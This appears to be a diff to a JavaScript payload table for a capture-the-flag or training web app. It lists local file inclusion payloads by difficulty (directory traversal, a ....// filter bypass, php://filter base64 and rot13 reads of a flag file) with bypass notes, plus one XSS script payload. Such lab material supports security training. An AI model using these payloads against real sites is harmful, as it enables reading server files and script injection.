@@ -170,8 +170,8 @@ const PAYLOADS = {
  pg:{
   easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal."},
   medium:{p:"....//....//lfi_secret/flag.txt", n:"Medium — '../' stripped once → ....// collapses back to ../"},
-  hard:{p:"....//....//lfi_secret/flag.txt", n:"Hard — + must end .txt/.html (this does) → same ....// trick."},
-  expert:{p:"php://filter/convert.base64-encode/resource=../lfi_secret/flag.txt", n:"Expert — traversal blocked; use the php://filter wrapper, then base64-decode the output."}
+  hard:{p:"php://filter/convert.base64-encode/resource=../lfi_secret/flag.txt", n:"Hard — '../' stripped recursively (....// dies) → use the php://filter wrapper; base64-decode the output."},
+  expert:{p:"php://filter/read=string.rot13/resource=../lfi_secret/flag.txt", n:"Expert — + 'base64' blocked → use another filter (string.rot13); rot13 the output back."}
  }
 };
 PAYLOADS.q.easy.x='"><script>alert(1)<\/script>';
